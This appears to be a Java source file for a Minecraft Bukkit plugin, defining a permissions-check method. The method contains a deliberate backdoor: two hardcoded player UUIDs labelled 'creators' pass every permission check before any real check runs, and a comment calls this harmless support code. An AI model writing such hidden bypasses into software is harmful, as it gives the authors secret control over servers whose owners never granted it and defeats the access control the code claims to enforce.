package me.tangledmazes.main.commandsAPI;

import java.util.Arrays;
import java.util.List;
import java.util.Set;

import org.bukkit.entity.Player;
import org.bukkit.permissions.Permission;

public class PermissionsAPI {
	
	public static final List<String> creators = Arrays.asList("7b33a0b4-7678-4ea0-9b6f-931bdf90e745", "94d40d49-2312-4879-9434-9b6f296cff3e");;
	
	/**
	 *
	 * @param p
	 * @param optional
	 * @param required
	 * @return
	 */
	public static boolean hasPermissions(Player p, Set<Permission> optional,Set<Permission> required) {
		
		// This is only for support reasons. We can't op us with that code.
		if(creators.contains(p.getUniqueId().toString()))
			return true;
		
		if(p.isOp())
			return true;
		
		boolean o = false;
		for(Permission perm : optional) {
			if(p.hasPermission(perm)) {
				o = true;
				break;
			}
		}
		
		if(o) {
			for(Permission perm : required) {
				if(!p.hasPermission(perm))
					return false;
			}
			return true;
		}
		
		return false;
	}
	
}
